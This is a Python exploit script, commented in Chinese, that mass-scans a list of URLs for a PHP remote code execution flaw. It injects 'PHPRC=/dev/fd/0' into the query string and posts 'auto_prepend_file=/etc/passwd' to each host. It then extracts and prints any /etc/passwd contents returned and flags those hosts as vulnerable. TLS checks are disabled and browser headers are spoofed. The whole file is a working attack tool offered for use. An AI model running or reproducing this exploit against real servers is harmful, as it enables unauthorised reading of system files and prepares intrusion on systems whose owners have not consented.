import argparse
import re
import urllib3
import aiohttp
import asyncio
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 此函数是进行url格式的处理
def process_url(url):
    # 添加http或https前缀
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    # 删除URL路径部分
    url_parts = url.split('/')
    url_without_path = '/'.join(url_parts[:3])

    # 去掉URL末尾的斜杠
    if url_without_path.endswith('/'):
        url_without_path = url_without_path[:-1]

    return url_without_path

# 提取/etc/passwd内容的函数
def extract_passwd_content(response_text):
    # 使用正则表达式匹配/etc/passwd的内容
    passwd_pattern = re.compile(r'root:.*?/usr/sbin/cli', re.DOTALL)
    matches = passwd_pattern.findall(response_text)

    return matches  # 返回匹配到的所有记录

# 异步发送自定义POST请求
async def send_custom_post_request_async(session, url, post_params):
    url = url + "/?PHPRC=/dev/fd/0"

    headers = {
        'Host': urlparse(url).netloc,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://' + urlparse(url).netloc,
        'Connection': 'close',
        'Referer': 'http://' + urlparse(url).netloc
    }

    try:
        post_data = "\n".join([f"{key}={value}" for key, value in post_params.items()])
        async with session.post(url, data=post_data, headers=headers, verify_ssl=False, timeout=50) as response:
            response_text = await response.text()
            return response, response_text
    except aiohttp.ClientError as e:
        print("请求发生异常:", e)
        return None, None

# 异步并发处理函数
async def scan_urls_async(urls):
    async with aiohttp.ClientSession() as session:
        for url in urls:
            processed_url = process_url(url.strip())
            print(f"\n验证URL: {processed_url}")
            post_params = {'auto_prepend_file': '/etc/passwd'}
            response, response_text = await send_custom_post_request_async(session, processed_url, post_params)
            if response is not None:
                matches = extract_passwd_content(response_text)
                if matches:
                    print(f"[+] Vulnerable: {url} - Status Code: {response.status} - 漏洞存在。")
                    print("匹配到的记录：")
                    for match in matches:
                        print(match)
                else:
                    print(f"[+] Not Vulnerable: {url} - Status Code: {response.status} - 漏洞不存在。")

def main():
    parser = argparse.ArgumentParser(description="PHP auto_prepend_file Remote Code Execution Vulnerability Scanner")
    parser.add_argument("-l", "--target_list", metavar="target_list", type=str, required=True,
                        help="Path to the target URL list file")
    args = parser.parse_args()

    with open(args.target_list, "r") as file:
        urls = file.readlines()

    if len(urls) == 0:
        print("未找到URL。")
        return

    loop = asyncio.get_event_loop()
    loop.run_until_complete(scan_urls_async(urls))

if __name__ == "__main__":
    main()
